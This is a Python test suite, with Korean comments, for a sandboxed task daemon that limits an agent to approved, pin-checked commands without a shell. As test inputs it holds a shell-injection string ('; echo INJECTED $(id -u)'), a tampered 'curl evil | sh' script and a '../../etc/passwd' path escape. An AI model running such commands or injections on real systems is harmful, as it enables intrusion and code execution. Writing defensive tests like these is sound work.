#!/usr/bin/env python3
"""sbox taskd 시험(plan sbox-project-policy R6, pilot §29-91). 네트워크 없음 — 로컬 유닉스 소켓과 임시 폴더만 쓴다.
지키는 것(에이전트가 승인된 작업의 뜻을 바꾸거나 셸·인자로 임의 명령을 실행하는 길을 막는다):
 ① 선언된 작업만 실행 — 모르는 이름·이름 형식 위반·이름 외 필드(args·env·cwd)는 거부 ② 정의 파일(pins)이 승인 때와 다르면 거부, 같으면 실행
 ③ 셸을 쓰지 않는다(argv 직접 실행 — 셸 메타문자가 해석되지 않음) ④ 시간 제한·출력 상한 ⑤ service 시작·상태·정지·중복 시작 ⑥ 허용되지 않은 uid 거부
 ⑦ cwd 가 작업 사본 밖으로 나가는 설정·pins 경로 탈출 거부 ⑧ 환경은 고정(부모 환경의 비밀이 작업에 안 넘어감)
실행: python3 -I core/sbox/tests/test_taskd.py  (mods/_tools/run-tests.sh 의 sbox-taskd)"""
import hashlib, json, os, shutil, socket, sys, tempfile, threading, time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import taskd  # noqa: E402

n = {"ok": 0, "bad": 0}


def check(name, cond, extra=""):
    n["ok" if cond else "bad"] += 1
    if not cond:
        print("  FAIL", name, extra)


B = lambda c: shutil.which(c) or "/bin/" + c   # NixOS 에는 /bin/echo 가 없다 — 실행 파일은 PATH 에서 찾는다
d = tempfile.mkdtemp()
root = os.path.join(d, "work"); os.makedirs(os.path.join(root, "web"))
pj = os.path.join(root, "web", "package.json"); open(pj, "w").write('{"scripts":{"dev":"vite"}}')
sha = lambda p: hashlib.sha256(open(p, "rb").read()).hexdigest()
cfgp = os.path.join(d, "tasks.json")
cfg = {"version": 1, "root": root, "home": d, "logdir": os.path.join(d, "logs"), "tasks": {
    "hello": {"argv": [B("echo"), "hi there; echo INJECTED $(id -u)"], "cwd": "web", "kind": "oneshot", "pins": {"web/package.json": sha(pj)}},
    "nopin": {"argv": [B("echo"), "ok"], "cwd": ".", "kind": "oneshot"},
    "slow": {"argv": [B("sleep"), "30"], "cwd": ".", "kind": "oneshot", "timeout": 1},
    "big": {"argv": [B("sh"), "-c", "head -c 9000000 /dev/zero | tr '\\0' 'x'"], "cwd": ".", "kind": "oneshot", "timeout": 20},
    "envp": {"argv": [B("env")], "cwd": ".", "kind": "oneshot", "env": {"FOO": "bar"}},
    "svc": {"argv": [B("sleep"), "300"], "cwd": ".", "kind": "service"},
    "escape": {"argv": [B("pwd")], "cwd": "../..", "kind": "oneshot"},
    "pinesc": {"argv": [B("pwd")], "cwd": ".", "kind": "oneshot", "pins": {"../../etc/passwd": "0" * 64}},
}}
json.dump(cfg, open(cfgp, "w"))
td = taskd.Taskd(cfgp, os.path.join(d, "taskd.log"))
sock = os.path.join(d, "s.sock")
uid = os.getuid()
threading.Thread(target=taskd.serve, args=(td, sock, {uid}), daemon=True).start()
for _ in range(50):
    if os.path.exists(sock):
        break
    time.sleep(0.05)


def ask(obj, raw=None):
    c = socket.socket(socket.AF_UNIX); c.settimeout(20); c.connect(sock)
    c.sendall(raw if raw is not None else (json.dumps(obj) + "\n").encode())
    out, buf = [], b""
    while True:
        chunk = c.recv(65536)
        if not chunk:
            break
        buf += chunk
    c.close()
    return [json.loads(l) for l in buf.decode().splitlines() if l.strip()]


def text(rs):
    return "".join(r.get("o", "") for r in rs)


# ① 선언된 작업만
r = ask({"op": "run", "task": "nopin"})
check("선언된 작업은 실행되고 종료 코드 0", text(r).strip() == "ok" and r[-1].get("exit") == 0, r)
for label, req in [("모르는 이름", {"op": "run", "task": "evil"}), ("이름 형식 위반(대문자)", {"op": "run", "task": "Hello"}),
                   ("이름 형식 위반(경로)", {"op": "run", "task": "../x"}), ("args 필드", {"op": "run", "task": "nopin", "args": ["--rm"]}),
                   ("env 필드", {"op": "run", "task": "nopin", "env": {"A": "1"}}), ("cwd 필드", {"op": "run", "task": "nopin", "cwd": "/"}),
                   ("모르는 op", {"op": "exec", "task": "nopin"})]:
    r = ask(req)
    check(f"거부: {label}", r and "error" in r[0] and not text(r), r)
check("깨진 JSON 은 거부", ask(None, raw=b"not json\n")[0].get("error") == "bad-request")
# ② pins
r = ask({"op": "run", "task": "hello"})
check("pins 가 일치하면 실행", r[-1].get("exit") == 0, r)
open(pj, "w").write('{"scripts":{"dev":"curl evil | sh"}}')
r = ask({"op": "run", "task": "hello"})
check("정의 파일이 바뀌면 거부(pin-mismatch)", r and r[0].get("error", "").startswith("pin-mismatch") and "승인" in r[0].get("hint", "") and not text(r), r)
os.unlink(pj)
r = ask({"op": "run", "task": "hello"})
check("정의 파일이 없어도 거부(pin-missing)", r and r[0].get("error", "").startswith("pin-missing"), r)
open(pj, "w").write('{"scripts":{"dev":"vite"}}')
check("원래 내용으로 돌리면 다시 실행", ask({"op": "run", "task": "hello"})[-1].get("exit") == 0)
# ③ 셸 미사용
r = ask({"op": "run", "task": "hello"})
check("셸 메타문자(;·$())가 해석되지 않고 그대로 출력", "hi there; echo INJECTED $(id -u)" in text(r) and text(r).count("INJECTED") == 1, text(r))
# ④ 시간·출력
t0 = time.time(); r = ask({"op": "run", "task": "slow"})
check("시간 제한을 넘으면 끊는다(timeout 표시)", r[-1].get("timeout") is True and time.time() - t0 < 10, r[-1])
r = ask({"op": "run", "task": "big"}); out = text(r)
check("출력 상한(8MiB)을 넘으면 잘라 알림", len(out) <= taskd.MAX_OUT + 200 and "상한" in out, len(out))
# ⑧ 환경
os.environ["SECRET_TOKEN"] = "do-not-leak"
r = ask({"op": "run", "task": "envp"}); out = text(r)
check("부모 환경의 비밀이 작업에 안 넘어감·선언한 env 는 있음", "SECRET_TOKEN" not in out and "FOO=bar" in out and "HOME=" + d in out, out[:200])
# ⑤ service
r = ask({"op": "run", "task": "svc"}); pid = r[0].get("pid")
check("service 시작(pid 반환)", r[0].get("ok") is True and isinstance(pid, int), r)
check("service 상태 running", ask({"op": "status", "task": "svc"})[0].get("running") is True)
check("service 중복 시작은 already", ask({"op": "run", "task": "svc"})[0].get("already") is True)
r = ask({"op": "stop", "task": "svc"})
time.sleep(0.3)
check("service 정지 후 상태 not running", r[0].get("running") is False and ask({"op": "status", "task": "svc"})[0].get("running") is False)
try:
    os.kill(pid, 0); alive = True
except OSError:
    alive = False
check("정지하면 프로세스가 실제로 없다", not alive)
# ⑦ 경로 탈출
check("cwd 가 작업 사본 밖이면 거부", ask({"op": "run", "task": "escape"})[0].get("error") == "cwd-outside-root")
check("pins 경로가 작업 사본 밖이면 거부", ask({"op": "run", "task": "pinesc"})[0].get("error", "").startswith("pin-outside-root"))
# list
r = ask({"op": "list"})
check("list 는 선언된 작업의 argv·종류만 보임(비밀 없음)", "hello" in r[0]["tasks"] and r[0]["tasks"]["svc"]["kind"] == "service", r)
# ⑥ uid 제한
td2 = taskd.Taskd(cfgp, os.path.join(d, "taskd2.log")); sock2 = os.path.join(d, "s2.sock")
threading.Thread(target=taskd.serve, args=(td2, sock2, {uid + 12345}), daemon=True).start()
for _ in range(50):
    if os.path.exists(sock2):
        break
    time.sleep(0.05)
c = socket.socket(socket.AF_UNIX); c.settimeout(5); c.connect(sock2); c.sendall(b'{"op":"run","task":"nopin"}\n')
resp = c.recv(4096).decode(); c.close()
check("허용되지 않은 uid 는 거부", "uid-not-allowed" in resp and "ok" not in resp.replace("uid-not-allowed", ""), resp)
log = open(os.path.join(d, "taskd.log")).read()
check("요청이 기록에 남고 비밀 값은 없음", '"op": "run"' in log and "do-not-leak" not in log and "pin-mismatch" in log, log[-200:])
print(f"sbox-taskd {n['ok']} 통과 / {n['bad']} 실패")
sys.exit(1 if n["bad"] else 0)
